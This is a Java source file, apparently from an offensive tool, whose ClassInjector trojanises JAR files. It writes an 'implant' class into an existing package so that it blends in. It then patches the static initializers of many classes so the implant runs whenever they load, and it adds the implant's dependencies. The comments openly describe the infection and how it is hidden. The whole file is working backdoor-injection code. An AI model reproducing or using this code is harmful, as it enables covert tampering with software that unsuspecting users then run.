package org.example.injector;

import javassist.bytecode.*;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Path;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.logging.Logger;
import java.util.zip.ZipException;

import static org.example.injector.Helpers.*;

public class ClassInjector {
    private final static Logger log = Logger.getLogger("ClassInjector");
    final static String IMPLANT_CLASS_NAME = "Init";
    private final ImplantHandler implantHandler;

    public ClassInjector(ImplantHandler implantHandler) {
        this.implantHandler = implantHandler;
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        ClassFile implantedClass = null;

        if (jarLooksSigned(targetJarFilePath)) {
            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
            return false;
        }

        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
        try {
            int countClinitModified = 0;
            for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    continue;
                }
                if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                    log.fine("Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
                    continue;
                }

                ClassFile currentlyProcessing = readClassFile(entry.getContent());
                ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);

                String targetPackageName = currentlyProcessingName.getPackageName();
                if (implantedClass == null) {
                    /*
                     * Since there are other classes in this directory, the implant will blend in better here.
                     * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                     */
                    ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
                    ClassFile renamedImplant = deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                    ClassName renamedImplantName = ClassName.of(renamedImplant);
                    JarEntry newJarEntry = new JarEntry(renamedImplantName.getClassFilePath());
                    try {
                        fiddler.addNewEntry(newJarEntry, asByteArray(renamedImplant));
                        log.info("Created implant class '" + newJarEntry.getName() + "'.");
                    } catch (ZipException e) {
                        log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
                        continue;   // TODO Signal these different endgames using exceptions instead
                    }

                    implantedClass = renamedImplant;
                }

                /*
                 * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
                 * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
                 * explicitly use the implant class. The implant will thus be called upon once per class that is
                 * infected. Remember that a class initializer will run only once per class.
                 * Several classes are infected because it's difficult to know what specific class will be used
                 * by an app.
                 */
                Optional<ClassFile> modifiedClass = modifyClinit(currentlyProcessing, implantedClass);
                if (modifiedClass.isEmpty()) {
                    // This class is too weird at the moment. Move on to the next one.
                    continue;
                }
                entry.replaceContentWith(asByteArray(modifiedClass.get()));
                countClinitModified++;
                log.fine("Modified class initializer for '" + entry.getName() + "'.");
            }
            if (countClinitModified > 0) {
                log.info("Modified the class initializer for " + countClinitModified + " classes.");
            } else {
                log.warning("No classes with suitable class initializers were found.");
            }

            boolean didInfect = implantedClass != null && countClinitModified > 0;

            // Add any dependency classes needed for the implant
            if (didInfect) {
                int countDependencies = 0;
                for (Map.Entry<ClassName, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
                    String fileName = dependencyEntry.getKey().getClassFilePath();
                    byte[] fileContent = dependencyEntry.getValue();

                    JarEntry newJarEntry = new JarEntry(fileName);
                    try {
                        fiddler.addNewEntry(newJarEntry, fileContent);
                        countDependencies++;
                        log.fine("Added dependency file '" + fileName + "'.");
                    } catch (ZipException e) {
                        // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                        log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
                        didInfect = false;
                        break;
                    }
                }
                log.info("Added " + countDependencies + " dependencies.");
            }

            if (didInfect) {
                fiddler.write(outputJar);
                log.info("Injection successful. Wrote output JAR to '" + outputJar + "'.");
            } else {
                log.warning("Injection failed. No output JAR was written.");
            }

            return didInfect;
        } catch (Exception e) {
            throw new IOException("Something went wrong", e);
        }
    }

    /**
     * Try to modify the class initializer of a class to include code that invokes the implant.
     * This method will only modify the class initializer to invoke the implants <code>init</code> method.
     * The implant class itself must exist on the classpath later when an app uses the modified class.
     *
     * @param targetClass  Target class
     * @param implantClass The implant class
     * @return A modified version of the targetClass if successful, empty otherwise
     */
    static Optional<ClassFile> modifyClinit(ClassFile targetClass, ClassFile implantClass) {
        ClassFile clone = cloneClassFile(targetClass);

        MethodInfo implantInitMethod = implantClass.getMethod("init");
        if (implantInitMethod == null) {
            throw new UnsupportedOperationException("Implant class does not have a 'public static void init()' function.");
        }

        MethodInfo currentClinit = clone.getMethod(MethodInfo.nameClinit);
        if (currentClinit != null && containsInvokeOpcodes(currentClinit)) {
            log.fine("Non-trivial <clinit> in '" + clone.getName() + "'. Skipping infection of this class.");
            return Optional.empty();
        }
        if (currentClinit == null) {
            // The target does not already have a class initializer (aka <clinit>) to merge implant code into.
            // This is fine, but to make things a bit more streamlined, create an empty one first.
            try {
                currentClinit = createAndAddClassInitializerStub(clone);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(clone.getConstPool());
        additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(clone.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);

        return Optional.of(clone);
    }

    private static boolean containsInvokeOpcodes(MethodInfo clinit) {
        Set<Integer> invokeOpcodes = Set.of(Opcode.INVOKESTATIC, Opcode.INVOKEVIRTUAL, Bytecode.INVOKEDYNAMIC, Bytecode.INVOKEINTERFACE, Bytecode.INVOKESPECIAL);

        if (clinit.getCodeAttribute() == null) {
            return false;
        }

        try {
            CodeIterator iterator = clinit.getCodeAttribute().iterator();
            iterator.begin();
            while (iterator.hasNext()) {
                int index = iterator.next();
                if (index + 1 >= iterator.getCodeLength()) {
                    break;
                }
                int opcode = (iterator.u16bitAt(index) & 0xFF00) >> 8;
                if (invokeOpcodes.contains(opcode)) {
                    return true;
                }
            }
        } catch (BadBytecode e) {
            throw new RuntimeException("Cannot make sense of <clinit> bytecode", e);
        }

        return false;
    }

    /**
     * Rename every reference to the original class name with a new name.
     * This will only consider debugging info.
     *
     * @param classFile      Target class
     * @param newPackageName New package name
     * @param newClassName   New class name
     * @return A modified copy of the target class, or the same instance if it was not modified
     */
    static ClassFile deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
        ClassFile clone = cloneClassFile(classFile);

        // TODO Rewrite this using ClassName instead of Strings
        String newFqcn;
        if (newPackageName.isEmpty()) {
            newFqcn = newClassName;
        } else {
            newFqcn = newPackageName + "." + newClassName;
        }
        String newSourceFileName = newClassName + ".java";

        AttributeInfo sourceFileAttr = clone.getAttribute(SourceFileAttribute.tag);
        if (sourceFileAttr != null) {
            ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
            sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
            if (sourceFileInfo.limit() != 2) {
                throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
            }
            int fileNameIndex = sourceFileInfo.getShort();
            String fileName = clone.getConstPool().getUtf8Info(fileNameIndex);
            String expectedName = ClassName.of(clone).getClassName();
            if (!fileName.startsWith(expectedName)) {
                throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
            }
            if (expectedName.equals(newClassName)) {
                // It already has this name. Don't do anything.
                return classFile;
            }
            int newClassNameIndex = clone.getConstPool().addUtf8Info(newSourceFileName);
            if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
            }
            sourceFileInfo.flip();
            sourceFileInfo.putShort((short) newClassNameIndex);
            sourceFileAttr.set(sourceFileInfo.array());
        }

        clone.setName(newFqcn);
        // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
        clone.compact();

        return clone;
    }
}
